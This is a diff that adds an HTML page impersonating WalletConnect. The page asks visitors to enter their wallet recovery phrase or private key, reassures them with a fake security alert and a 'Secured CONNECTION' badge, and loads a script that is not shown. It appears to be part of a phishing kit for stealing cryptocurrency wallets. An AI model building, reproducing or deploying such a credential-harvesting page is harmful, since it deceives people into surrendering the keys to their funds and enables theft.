@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="connection.css">
+</head>
+
+<body>
+
+    <div class="container">
+
+        <div class="content_one">
+
+            <div class="content_one_sub">
+
+                <div class="content_one_sub_container">
+
+                    <div class="content_one_sub_container_content">
+
+                        <div class="content_one_sub_container_content_img">
+                            <img src="img/wc1.png" alt="">
+                            <h3>Walletconnect</h3>
+                        </div>
+
+                        <div class="content_one_sub_container_content_text">
+                            <p><span>Info alert!</span> Securely use any of the options below</p>
+                        </div>
+
+                        <div class="input_container">
+
+                            <div class="input_container_head">
+                                <button onclick="showTextarea()" class="active">Phrase</button>
+                                <button onclick="showInput()">Private Key</button>
+                            </div>
+
+                            <form action="">
+                            <div class="input_container_boby">
+                                
+                                <textarea name="" id="textarea" cols="30" rows="6"
+                                    placeholder="Enter your recovery phrase (typically 12-24 words separated by a single space)" required></textarea>
+                                <input type="text" id="input" placeholder="Enter your private key" required>
+                                
+                        
+                            </div>
+
+                            <div class="input_container_link">
+                                <button id="process" onclick="proceed()" >Proceed</button>
+                            </div>
+                        </form>
+                        </div>
+
+                        <div class="content_one_sub_container_content_last">
+                            <img src="img/shield.png" alt="">
+                            <p>Secured <span>CONNECTION</span></p>
+                        </div>
+
+
+                    </div>
+
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    </div>
+
+
+</body>
+<script src="index.js"></script>
+
+</html>
